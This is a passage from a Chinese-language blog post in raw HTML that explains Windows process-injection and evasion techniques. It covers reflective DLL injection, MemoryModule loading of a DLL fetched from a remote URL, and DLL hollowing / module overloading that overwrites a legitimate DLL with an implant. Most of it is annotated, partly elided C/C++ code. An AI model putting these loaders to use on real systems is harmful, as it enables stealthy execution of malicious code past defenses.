&quot;reflective_dll.x64.dll&quot;;</span><br><span class=\"line\">#else</span><br><span class=\"line\">#ifdef WIN_X86</span><br><span class=\"line\">\tchar * cpDllFile  &#x3D; &quot;reflective_dll.dll&quot;;</span><br><span class=\"line\">#else WIN_ARM</span><br><span class=\"line\">\tchar * cpDllFile  &#x3D; &quot;reflective_dll.arm.dll&quot;;</span><br><span class=\"line\">#endif</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">....</span><br><span class=\"line\"></span><br><span class=\"line\">hFile &#x3D; CreateFileA( cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );</span><br><span class=\"line\">if( hFile &#x3D;&#x3D; INVALID_HANDLE_VALUE )</span><br><span class=\"line\">    BREAK_WITH_ERROR( &quot;Failed to open the DLL file&quot; );</span><br><span class=\"line\"></span><br><span class=\"line\">dwLength &#x3D; GetFileSize( hFile, NULL );</span><br><span class=\"line\">if( dwLength &#x3D;&#x3D; INVALID_FILE_SIZE || dwLength &#x3D;&#x3D; 0 )</span><br><span class=\"line\">    BREAK_WITH_ERROR( &quot;Failed to get the DLL file size&quot; );</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 开辟新空间</span><br><span class=\"line\">lpBuffer &#x3D; HeapAlloc( GetProcessHeap(), 0, dwLength );</span><br><span class=\"line\">if( !lpBuffer )</span><br><span class=\"line\">    BREAK_WITH_ERROR( &quot;Failed to get the DLL file size&quot; );</span><br><span class=\"line\">    </span><br><span class=\"line\">&#x2F;&#x2F; 将DLL读取到新空间中</span><br><span class=\"line\">if( ReadFile( hFile, lpBuffer, dwLength, &amp;dwBytesRead, NULL ) &#x3D;&#x3D; FALSE )</span><br><span class=\"line\">    BREAK_WITH_ERROR( &quot;Failed to alloc a buffer!&quot; );</span><br></pre></td></tr></table></figure>\n\n<p>提升当前进程权限</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken ) )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    priv.PrivilegeCount           &#x3D; 1;</span><br><span class=\"line\">    priv.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED;</span><br><span class=\"line\"></span><br><span class=\"line\">    if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &amp;priv.Privileges[0].Luid ) )</span><br><span class=\"line\">        AdjustTokenPrivileges( hToken, FALSE, &amp;priv, 0, NULL, NULL );</span><br><span class=\"line\"></span><br><span class=\"line\">    CloseHandle( hToken );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>打开进程，通过 <strong>LoadRemoteLibraryR</strong> 将dll注入到目标进程中。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 打开目标进程</span><br><span class=\"line\">hProcess &#x3D; OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId );</span><br><span class=\"line\">if( !hProcess )</span><br><span class=\"line\">    BREAK_WITH_ERROR( &quot;Failed to open the target process&quot; );</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 通过LoadRemoteLibraryR注入dll到进程中</span><br><span class=\"line\">hModule &#x3D; LoadRemoteLibraryR( hProcess, lpBuffer, dwLength, NULL );</span><br><span class=\"line\">if( !hModule )</span><br><span class=\"line\">    BREAK_WITH_ERROR( &quot;Failed to inject the DLL&quot; );</span><br><span class=\"line\"></span><br><span class=\"line\">printf( &quot;[+] Injected the &#39;%s&#39; DLL into process %d.&quot;, cpDllFile, dwProcessId );</span><br><span class=\"line\"></span><br><span class=\"line\">WaitForSingleObject( hModule, -1 );</span><br></pre></td></tr></table></figure>\n\n<p>来分析下 <strong>LoadRemoteLibraryR</strong> </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 通过GetReflectiveLoaderOffset找到ReflectiveLoader函数对应的偏移</span><br><span class=\"line\">dwReflectiveLoaderOffset &#x3D; GetReflectiveLoaderOffset( lpBuffer );</span><br><span class=\"line\">if( !dwReflectiveLoaderOffset )</span><br><span class=\"line\">\tbreak;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 在目标进程中开辟空间</span><br><span class=\"line\">lpRemoteLibraryBuffer &#x3D; VirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); </span><br><span class=\"line\">if( !lpRemoteLibraryBuffer )</span><br><span class=\"line\">\tbreak;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 将恶意DLL写到目标进程中</span><br><span class=\"line\">if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL ) )</span><br><span class=\"line\">\tbreak;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 通过偏移找到ReflectiveLoader函数地址</span><br><span class=\"line\">lpReflectiveLoader &#x3D; (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 远程调用ReflectiveLoader</span><br><span class=\"line\">hThread &#x3D; CreateRemoteThread( hProcess, NULL, 1024*1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &amp;dwThreadId );</span><br></pre></td></tr></table></figure>\n\n<p>再分析 <strong>GetReflectiveLoaderOffset</strong> 是怎么找到DLL的ReflectiveLoader偏移。通过遍历DLL的导出表找到ReflectiveLoader，并计算出相对于DLL基地址的偏移量。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">DWORD GetReflectiveLoaderOffset( VOID * lpReflectiveDllBuffer )</span><br><span class=\"line\">&#123;\t</span><br><span class=\"line\">\tUINT_PTR uiBaseAddress   &#x3D; 0;</span><br><span class=\"line\">\tUINT_PTR uiExportDir     &#x3D; 0;</span><br><span class=\"line\">\tUINT_PTR uiNameArray     &#x3D; 0;</span><br><span class=\"line\">\tUINT_PTR uiAddressArray  &#x3D; 0;</span><br><span class=\"line\">\tUINT_PTR uiNameOrdinals  &#x3D; 0;</span><br><span class=\"line\">\tDWORD dwCounter          &#x3D; 0;</span><br><span class=\"line\">#ifdef WIN_X64</span><br><span class=\"line\">\tDWORD dwCompiledArch &#x3D; 2;</span><br><span class=\"line\">#else</span><br><span class=\"line\">\t&#x2F;&#x2F; This will catch Win32 and WinRT.</span><br><span class=\"line\">\tDWORD dwCompiledArch &#x3D; 1;</span><br><span class=\"line\">#endif</span><br><span class=\"line\">\t</span><br><span class=\"line\">    &#x2F;&#x2F; uiBaseAddress初始化为dll的基址</span><br><span class=\"line\">\tuiBaseAddress &#x3D; (UINT_PTR)lpReflectiveDllBuffer;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 获取DLL的PE头</span><br><span class=\"line\">\tuiExportDir &#x3D; uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 检查DLL的架构(x32 or x64)</span><br><span class=\"line\">\tif( ((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic &#x3D;&#x3D; 0x010B ) &#x2F;&#x2F; PE32</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif( dwCompiledArch !&#x3D; 1 )</span><br><span class=\"line\">\t\t\treturn 0;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse if( ((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic &#x3D;&#x3D; 0x020B ) &#x2F;&#x2F; PE64</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif( dwCompiledArch !&#x3D; 2 )</span><br><span class=\"line\">\t\t\treturn 0;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\treturn 0;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 定位导出表</span><br><span class=\"line\">\tuiNameArray &#x3D; (UINT_PTR)&amp;((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];</span><br><span class=\"line\">    </span><br><span class=\"line\">    &#x2F;&#x2F; 获取导出表在文件状态下的地址</span><br><span class=\"line\">\tuiExportDir &#x3D; uiBaseAddress + Rva2Offset( ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress );</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 获取导出函数名称表在文件状态下的地址</span><br><span class=\"line\">\tuiNameArray &#x3D; uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNames, uiBaseAddress );</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 获取导出函数地址表在文件状态下的地址</span><br><span class=\"line\">\tuiAddressArray &#x3D; uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 获取导出函数序号表在文件状态下的地址</span><br><span class=\"line\">\tuiNameOrdinals &#x3D; uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNameOrdinals, uiBaseAddress );\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 获取通过函数名称来导出的数量</span><br><span class=\"line\">\tdwCounter &#x3D; ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;NumberOfNames;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 遍历所有导出函数</span><br><span class=\"line\">\twhile( dwCounter-- )</span><br><span class=\"line\">\t&#123;\t</span><br><span class=\"line\">        &#x2F;&#x2F; 获取导出函数的名称</span><br><span class=\"line\">\t\tchar * cpExportedFunctionName &#x3D; (char *)(uiBaseAddress + Rva2Offset( DEREF_32( uiNameArray ), uiBaseAddress ));</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">        &#x2F;&#x2F; 检查导出函数的名称是否是“ReflectiveLoader”</span><br><span class=\"line\">\t\tif( strstr( cpExportedFunctionName, &quot;ReflectiveLoader&quot; ) !&#x3D; NULL )</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t&#x2F;&#x2F; 定位导出函数地址表</span><br><span class=\"line\">\t\t\tuiAddressArray &#x3D; uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t\t\t&#x2F;&#x2F; uiNameOrdinals提供ReflectiveLoader函数的序号，并通过此序号与导出函数地址表的起始位置计算,从而得出ReflectiveLoader函数的地址</span><br><span class=\"line\">\t\t\tuiAddressArray +&#x3D; ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t&#x2F;&#x2F; 返回ReflectiveLoader函数在文件状态下的偏移量</span><br><span class=\"line\">\t\t\treturn Rva2Offset( DEREF_32( uiAddressArray ), uiBaseAddress );</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">        &#x2F;&#x2F; 指向下一个导出函数的名称</span><br><span class=\"line\">\t\tuiNameArray +&#x3D; sizeof(DWORD);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&#x2F;&#x2F; 指向下一个导出函数的序号</span><br><span class=\"line\">\t\tuiNameOrdinals +&#x3D; sizeof(WORD);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>至此注入器分析完成。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240617012803371.png\" alt=\"image-20240617012803371\"></p>\n<p>最后该方法还有变形应用 <a href=\"https://idiotc4t.com/defense-evasion/reflectivedllinjection-variation#jian-jie\">ReflectiveDLLInjection变形应用</a>，更好的隐藏了特征。</p>\n<h2 id=\"Memory-Module\"><a href=\"#Memory-Module\" class=\"headerlink\" title=\"Memory Module\"></a>Memory Module</h2><p>memory module（内存模块）过程非常类似反射DLL加载，二者实现的都是模拟PE加载过程、在内存中加载dll，但是内存模块更为精细，主要差别为：一、反射dll直接将所有代码copy到目标的一片RWX的内存中，内存模块则是按照将不同节进行不同的标记，可以将没有用的节释放掉，因此内存模块在内存中表现的更像正常DLL的属性分布因此更具隐蔽性。二、反射dll所有操作都是由目标进程进行，内存模块操作由本身exe进行自身注入。具体参看项目：<a href=\"https://github.com/fancycode/MemoryModule\">https://github.com/fancycode/MemoryModule</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1719931962740.png\" alt=\"QQ_1719931962740\"></p>\n<p>反射DLL：会直接多出两片private的RWX属性内存。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240620105057906.png\" alt=\"image-20240620105057906\"></p>\n<p>内存模块：</p>\n<p>引入 <code>MemoryModule.h</code> 和 <code>MemoryModule.c</code> ，同时改造成远程拉取DLL到内存中。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include&lt;iostream&gt;</span><br><span class=\"line\">#include &lt;winsock2.h&gt;</span><br><span class=\"line\">#include&lt;Windows.h&gt;</span><br><span class=\"line\">#include&lt;string&gt;</span><br><span class=\"line\">#include &lt;tchar.h&gt;</span><br><span class=\"line\">#include &quot;MemoryModule.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma comment(lib, &quot;ws2_32.lib&quot;)</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef BOOL(*Module)(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved);</span><br><span class=\"line\"></span><br><span class=\"line\">char* readUrl(const char* szUrl, long&amp; fileSize)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   ......</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void LoadFromMemory(void)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    void* data;</span><br><span class=\"line\">    size_t size;</span><br><span class=\"line\">    HMEMORYMODULE handle;</span><br><span class=\"line\">    Module DllMain;</span><br><span class=\"line\">    long fileSize;</span><br><span class=\"line\"></span><br><span class=\"line\">    data &#x3D; (void *)readUrl(&quot;http:&#x2F;&#x2F;example.com&#x2F;test.dll&quot;,fileSize);</span><br><span class=\"line\">    if (data &#x3D;&#x3D; NULL)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cout &lt;&lt; &quot;[-]Open DLL Fail&quot; &lt;&lt; endl;</span><br><span class=\"line\">        return;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t&#x2F;&#x2F; 自动触发dllmain</span><br><span class=\"line\">    handle &#x3D; MemoryLoadLibrary(data, size);</span><br><span class=\"line\">    MemoryFreeLibrary(handle);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    LoadFromMemory();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>内存分布还算正常，但还是存在显眼的 “private” RX内存。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240624150049093.png\" alt=\"image-20240624150049093\"></p>\n<p>PS：由于memory module的特点，项目无法做到直接与进程注入相结合，目前有一个与python相结合的项目 <a href=\"https://github.com/naksyn/PythonMemoryModule%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%9C%AA%E6%9D%A5%E6%9C%89%E5%85%AC%E5%BC%80%E9%A1%B9%E7%9B%AE%E8%83%BD%E5%92%8C%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%9B%B8%E7%BB%93%E5%90%88%E5%B0%B1%E6%AF%94%E8%BE%83%E5%A5%BD%E4%BA%86\">https://github.com/naksyn/PythonMemoryModule，如果未来有公开项目能和进程注入相结合就比较好了</a></p>\n<h2 id=\"DLL-Hollowing\"><a href=\"#DLL-Hollowing\" class=\"headerlink\" title=\"DLL Hollowing\"></a>DLL Hollowing</h2><h3 id=\"内存类型\"><a href=\"#内存类型\" class=\"headerlink\" title=\"内存类型\"></a>内存类型</h3><p>在Windows虚拟内存管理中，通过 <strong>MEMORY_BASIC_INFORMATION</strong> 结构体描述某范围内内存块的具体信息：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">typedef struct _MEMORY_BASIC_INFORMATION &#123;</span><br><span class=\"line\">  PVOID  BaseAddress;\t\t&#x2F;&#x2F;指向查询的内存区域的起始地址</span><br><span class=\"line\">  PVOID  AllocationBase;\t&#x2F;&#x2F;指向分配的内存块的起始地址。 BaseAddress 成员指向的页面包含在此分配范围内。</span><br><span class=\"line\">  DWORD  AllocationProtect;\t&#x2F;&#x2F;分配时的内存保护属性。例如，PAGE_READONLY、PAGE_READWRITE 等</span><br><span class=\"line\">  WORD   PartitionId;\t\t&#x2F;&#x2F;标识内存区域所属的分区 ID, Win10引入</span><br><span class=\"line\">  SIZE_T RegionSize;\t\t&#x2F;&#x2F;从基址开始的区域大小，其中所有页面都具有相同的属性（以字节为单位）</span><br><span class=\"line\">  DWORD  State;\t\t\t\t&#x2F;&#x2F;内存块的当前状态。 MEM_COMMIT（已提交）、MEM_RESERVE（已保留）和 MEM_FREE（空闲）</span><br><span class=\"line\">  DWORD  Protect;\t\t\t&#x2F;&#x2F;内存块的当前保护属性。可能的值包括 PAGE_NOACCESS、PAGE_READONLY、PAGE_READWRITE 等</span><br><span class=\"line\">  DWORD  Type;\t\t\t\t&#x2F;&#x2F;内存块的类型。可能的值包括 MEM_IMAGE、MEM_MAPPED和 MEM_PRIVATE</span><br><span class=\"line\">&#125; MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;</span><br></pre></td></tr></table></figure>\n\n<p>在打开SystemInformer.exe查看内存区域时，可对应内存块类型的三种commit：<strong>Private、Mapped、Image</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1719989713022.png\" alt=\"QQ_1719989713022\"></p>\n<p>这三种内存块类型的差异主要为：</p>\n<ul>\n<li><p>Private：标识内存块是由进程私有使用的，通常由内存分配函数（如 VirtualAlloc）分配</p>\n</li>\n<li><p>Image：在系统加载运行可执行文件时，标识加载到内存中的可执行文件（PE）和所需动态链接库（DLL）的映像文件，其对应的RX区域为.text段</p>\n</li>\n<li><p>Mapped：标识内存块是通过内存映射文件（memory-mapped files）分配的。这些内存块与磁盘上的文件内容直接关联如：</p>\n<p>.db、.mui和.dat文件从磁盘映射到内存中供应用程序读取</p>\n</li>\n</ul>\n<hr>\n<p>在了解内存块类型差异后，结合前面几种技术所展现的 <strong>Private</strong> 内存类型的明显特征，思考如果将恶意代码隐藏到另外两种内存类型（Mapped或Image）中，是不是就会有较好的隐匿效果呢？DLL Hollowing就是这样的一种技术，其主要思路为：<strong>在目标进程内主动加载一个系统中合法的dll，此时对应内存类型为：Image，然后将dll对应的内存内容覆写为恶意代码，通过执行入口点函数/PE加载 启动恶意代码，同时由于使用了 LoadLibrary系列API、文件映射等手段，避免了使用 VirtualAllocEx,WriteProcessMemory等敏感API</strong></p>\n<p>另外在实现此技术时应该注意以下几点：</p>\n<ul>\n<li>其IMAGE_SECTION_HEADER.Misc.VirtualSize大于或等于被植入的 shellcode 的大小</li>\n<li>此类 DLL 不应加载到目标进程中，因为这意味着它们的修改可能会导致崩溃</li>\n</ul>\n<p>很符合 “镂空” 这个词 :)，我将此分为五部分：</p>\n<ul>\n<li>经典Dll Hollowing</li>\n<li>Module Overloading</li>\n<li>Module Stomping</li>\n<li>bypass cfg</li>\n<li>远程注入</li>\n</ul>\n<h3 id=\"经典Dll-Hollowing\"><a href=\"#经典Dll-Hollowing\" class=\"headerlink\" title=\"经典Dll Hollowing\"></a>经典Dll Hollowing</h3><p>此处和Module Overloading的学习直接分析项目：<a href=\"https://github.com/hasherezade/module_overloading%EF%BC%8C%E6%AD%A4%E9%A1%B9%E7%9B%AE%E9%80%9A%E8%BF%87libPeConv%E5%BA%93%E4%B8%93%E9%97%A8%E7%94%A8%E4%BA%8E%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%93%8D%E4%BD%9CPE\">https://github.com/hasherezade/module_overloading，此项目通过libPeConv库专门用于加载和操作PE</a></p>\n<p>特点：通过 <strong>LoadLibraryA/LoadLibraryEx 引入合法Dll，原项目使用LoadLibraryA，这里修改为LoadLibraryEx，只加载Dll但不执行Dllmain函数</strong></p>\n<p>首先将evil PE（implant_name），完整内容copy到buffer中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">\t&#x2F;&#x2F; tapi32.dll</span><br><span class=\"line\">\tstd::cout &lt;&lt; &quot;target_dll: &quot; &lt;&lt; dll_name &lt;&lt; &quot;\\n&quot;;</span><br><span class=\"line\">\t&#x2F;&#x2F; evil code</span><br><span class=\"line\">\tstd::cout &lt;&lt; &quot;implant_dll: &quot; &lt;&lt; implant_name &lt;&lt; &quot;\\n&quot;;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tsize_t raw_size &#x3D; 0;</span><br><span class=\"line\">\t&#x2F;&#x2F; 将evil code的文件原始内容分配到buffer中</span><br><span class=\"line\">\tBYTE *raw_payload &#x3D; peconv::load_file(implant_name, raw_size);</span><br><span class=\"line\"></span><br><span class=\"line\">#ifdef _DEBUG</span><br><span class=\"line\">\tstd::cerr &lt;&lt; &quot;[+] Raw implant loaded\\n&quot;;</span><br><span class=\"line\">#endif</span><br><span class=\"line\">\t&#x2F;&#x2F; 判断符合系统位数</span><br><span class=\"line\">\tif (!is_compatibile(raw_payload)) &#123;</span><br><span class=\"line\">\t\tsystem(&quot;pause&quot;);</span><br><span class=\"line\">\t\treturn -1;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>开始镂空（module_overloader）通过将PE映射到内存，处理导入导出表后，将合法Dll内存覆写。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 模块重载</span><br><span class=\"line\">LPVOID mapped &#x3D; module_overloader(raw_payload, raw_size, dll_name);</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\">PVOID module_overloader(BYTE* raw_payload, size_t raw_size, char *target_dll)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t&#x2F;&#x2F; 将 PE 从给定缓冲区加载到内存将其映射为虚拟格式</span><br><span class=\"line\">\tBYTE* payload &#x3D; peconv::load_pe_module(raw_payload, raw_size, payload_size, false, false);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 加载payload导入表</span><br><span class=\"line\">\tpeconv::load_imports(payload)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#x2F;&#x2F; 通过 *LoadLibraryEx* 返回Dll地址</span><br><span class=\"line\">\tPVOID mapped &#x3D; load_target_dll(target_dll);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; Relocate the payload into the target base:</span><br><span class=\"line\">\t&#x2F;&#x2F; payload到Dll地址重定向问题</span><br><span class=\"line\">\tpeconv::relocate_module(payload, payload_size, (ULONGLONG)mapped)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#x2F;&#x2F; Overwrite the target DLL with the payload</span><br><span class=\"line\">\t&#x2F;&#x2F; 将payload覆盖到Dll内</span><br><span class=\"line\">\toverwrite_mapping(mapped, payload, payload_size)</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn mapped;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\">&#x2F;&#x2F;覆盖Dll：overwrite_mapping</span><br><span class=\"line\">bool overwrite_mapping(PVOID mapped, BYTE* implant_dll, size_t implant_size)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tHANDLE hProcess &#x3D; GetCurrentProcess();</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#x2F;&#x2F;cleanup previous module:</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tsize_t prev_size &#x3D; peconv::get_image_size((BYTE*)mapped);</span><br><span class=\"line\">\t&#x2F;&#x2F;将Dll全部置0</span><br><span class=\"line\">\tif (prev_size) &#123;</span><br><span class=\"line\">\t\tif (!VirtualProtect((LPVOID)mapped, prev_size, PAGE_READWRITE, &amp;oldProtect)) return false;</span><br><span class=\"line\">\t\tmemset(mapped, 0, prev_size);</span><br><span class=\"line\">\t\tif (!VirtualProtect((LPVOID)mapped, prev_size, PAGE_READONLY, &amp;oldProtect)) return false;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!VirtualProtect((LPVOID)mapped, implant_size, PAGE_READWRITE, &amp;oldProtect)) &#123;</span><br><span class=\"line\">\t\t&#x2F;&#x2F; 判断加载Dll的内存大小与evil code大小，后者不能比前者大</span><br><span class=\"line\">\t\tif (implant_size &gt; prev_size) &#123;</span><br><span class=\"line\">\t\t\tstd::cout &lt;&lt; &quot;[-] The implant is too big for the target!\\n&quot;;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treturn false;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t&#x2F;&#x2F; 由于二者都已经映像了，所以直接将evil code 复制过去</span><br><span class=\"line\">\tmemcpy(mapped, implant_dll, implant_size);</span><br><span class=\"line\">\tis_ok &#x3D; true;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 设置各个节的正确权限属性</span><br><span class=\"line\">\tif (!set_sections_access(mapped, implant_dll, implant_size)) &#123;</span><br><span class=\"line\">\t\tis_ok &#x3D; false;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn is_ok;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在镂空重写后，获取偏移，执行入口点 :)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 获取evil code到入口点的RVA</span><br><span class=\"line\">DWORD ep_rva &#x3D; peconv::get_entry_point_rva(raw_payload);</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 检查evil code是不是Dll</span><br><span class=\"line\">bool is_dll &#x3D; peconv::is_module_dll(raw_payload);</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 释放原始evil code</span><br><span class=\"line\">peconv::free_file(raw_payload); raw_payload &#x3D; nullptr;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 执行payload</span><br><span class=\"line\">&#x2F;&#x2F; Dll：执行入口点 exe：指针执行</span><br><span class=\"line\">int ret &#x3D; run_implant(mapped, ep_rva, is_dll);</span><br></pre></td></tr></table></figure>\n\n<p>那么整个流程如图所示：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1720327600259.png\" alt=\"QQ_1720327600259\"></p>\n<p>效果：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240707153548533.png\" alt=\"image-20240707153548533\"></p>\n<h3 id=\"Module-Overloading\"><a href=\"#Module-Overloading\" class=\"headerlink\" title=\"Module Overloading\"></a>Module Overloading</h3><p>该部分思路同上，只是项目中使用了 <strong>映射注入（Mapping Injection）</strong>便归类到Module Overloading中，其实只是技术细节有差别，利用思路大同小异。特点：项目通过 <strong>映射技术之一：NtCreateSection + NtMapViewOfSection 引入合法Dll</strong> 映射到本地进程（也可以映射到远程进程）并直接修改。对该部分的本地视图的更改也会导致远程视图被修改。这里通过使用映射避免使用 <strong>LoadLibrary系列API</strong> </p>\n<p>首先介绍映射技术大体思路：通过一些系统函数组合将磁盘中的文件直接映射到虚拟内存中，将恶意PE进行覆盖或shellcode填充，执行入口。</p>\n<p>有以下几条实现方法 <a href=\"https://github.com/izj007/wechat/blob/main/articles/%5Bsnowming%5D-2021-8-15-%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E6%98%A0%E5%B0%84%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5.md\">使用文件映射进行远程进程注入</a>：</p>\n<ul>\n<li>CreateFileMapping → MapViewOfFile  → MapViewOfFile2</li>\n<li>NtCreateSection → NtMapViewOfSection（项目采用方式）</li>\n<li>CreateFileMapping →  MapViewOfFile → NtMapViewOfSection（cobalt strike采用方式）</li>\n</ul>\n<p>那么在项目中代码区别如下，不再使用 LoadLibrary，而是使用映射技术：</p>\n<figure class=\"highlight plain\"><table><tr><td 